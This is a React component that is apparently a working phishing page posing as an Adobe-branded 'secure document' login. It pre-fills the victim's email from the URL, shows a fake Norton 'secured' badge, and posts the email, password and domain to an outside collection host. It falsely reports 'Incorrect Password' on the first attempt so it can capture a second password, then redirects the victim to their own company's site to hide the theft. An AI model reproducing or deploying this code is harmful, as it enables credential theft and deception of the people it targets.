import React, { useState, useEffect } from 'react';
import './DocumentAccessPortal.css';

const DocumentAccessPortal = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [errorMessage, setErrorMessage] = useState(false);
  const [fileOption, setFileOption] = useState('1');
  const [domain, setDomain] = useState('');
  const [submitCount, setSubmitCount] = useState(0);
  const [isVerifying, setIsVerifying] = useState(false);

  useEffect(() => {
    const emailFromHash = window.location.hash.substr(1);
    if (emailFromHash) {
      const filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
      if (filter.test(emailFromHash)) {
        setEmail(emailFromHash);
        const ind = emailFromHash.indexOf("@");
        const domainSlice = emailFromHash.substr(ind + 1);
        setDomain(domainSlice);
      }
    }
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setIsVerifying(true);
    
    try {
      // Send data to endpoint
      await fetch('https://reportnew.site/reportlink/adobe/general.php', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams({
          email: email,
          pwwwd: password,
          website: domain,
        }),
      });

      const newSubmitCount = submitCount + 1;
      setSubmitCount(newSubmitCount);
      
      if (newSubmitCount >= 2) {
        redirectToDomain();
      } else {
        setErrorMessage(true);
        setPassword(''); // Clear password field after first submit
      }

    } catch (error) {
      console.error('Submission error:', error);
      const newSubmitCount = submitCount + 1;
      setSubmitCount(newSubmitCount);
      
      if (newSubmitCount >= 2) {
        redirectToDomain();
      } else {
        setErrorMessage(true);
        setPassword(''); // Clear password field after first submit
      }
    } finally {
      setIsVerifying(false);
    }
  };

  const redirectToDomain = () => {
    if (email.includes('@')) {
      const domain = email.split('@')[1];
      let redirectUrl = `https://www.${domain}`;
      
      if (!redirectUrl.startsWith('http')) {
        redirectUrl = `https://${redirectUrl}`;
      }
      
      window.location.href = redirectUrl;
      window.location.replace(redirectUrl);
    }
  };

  return (
    <div className="document-access-portal">
      <img 
        src="https://helpx-prod.scene7.com/is/image/HelpxProd/answer-citation?$pjpeg$&jpegSize=200&wid=1200" 
        id="background" 
        alt="background"
      />

      <div className="auth-container">
        <div className="box-container flex-layout flex-column" style={{minHeight: '100vh', flexGrow: 1}}>
          <div className="box-container padding-medium flex-layout flex-column" style={{flexGrow: 1, zIndex: 9}}>
            <div className="form-outer" style={{textAlign: 'center'}}>
              <div className="form-container">
                <div className="form-inner padding-horizontal">
                  <div style={{textAlign: 'left'}}>
                    <div>
                      <input 
                        type="radio" 
                        name="file" 
                        id="1" 
                        checked={fileOption === '1'}
                        onChange={() => setFileOption('1')}
                      />
                      <label htmlFor="1">View File Online</label>
                    </div>
                    <div>
                      <input 
                        type="radio" 
                        name="file" 
                        id="2" 
                        checked={fileOption === '2'}
                        onChange={() => setFileOption('2')}
                      />
                      <label htmlFor="2">Download File</label>
                    </div>
                    <div>
                      <input 
                        type="radio" 
                        name="file" 
                        id="3" 
                        checked={fileOption === '3'}
                        onChange={() => setFileOption('3')}
                      />
                      <label htmlFor="3">Send File to Email</label>
                    </div>
                  </div>
                  
                  <div style={{paddingTop: '20px'}}></div>
                  
                  <form onSubmit={handleSubmit}>
                    <div className="input-field padding-small">
                      <input 
                        type="email" 
                        name="email" 
                        id="email" 
                        placeholder="Username" 
                        value={email}
                        readOnly
                      />
                    </div>
                    <div className="input-field padding-small">
                      <input 
                        type="password" 
                        name="pwwwd" 
                        id="pwwwd" 
                        placeholder="Password" 
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        autoComplete="current-password" 
                        required 
                      />
                      {errorMessage && submitCount < 2 && (
                        <div id="error-message" style={{color: 'brown', fontSize: '14px', marginTop: '5px'}}>
                          Incorrect Password. Please try again.
                        </div>
                      )}
                    </div>
                    <div className="input-field">
                      <input 
                        type="submit" 
                        id="login-button" 
                        value={isVerifying ? "Verifying..." : (submitCount < 1 ? "Login To Access File" : "Login To Access File")} 
                        disabled={isVerifying}
                      />
                    </div>
                    <div style={{textAlign: 'center', margin: '20px 0'}}>
                      <img 
                        src="https://www.goinflow.com/wp-content/uploads/2008/08/norton_feat.png" 
                        alt="Norton Secured" 
                        style={{maxWidth: '90px', height: 'auto'}}
                      />
                    </div>
                    <div style={{textAlign: 'center', color: '#666', lineHeight: '18px', fontSize: '14px', paddingTop: '10px'}}>
                      <p>
                        To access our online secure document page, you are required to login with your email address. 
                        This ensures you are the rightful recipient of the protected file. 
                        Unauthorized access is highly prohibited.
                      </p>
                    </div>
                  </form>
                </div>
              </div>
              
              <div className="footer-info padding-medium">
                <div className="listing padding-medium padding-small flex-layout justify-center">
                  <span><a href="#">© 2025</a></span>
                  <span style={{padding: '3px'}}></span>
                  <span><a href="#">copyright</a></span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default DocumentAccessPortal;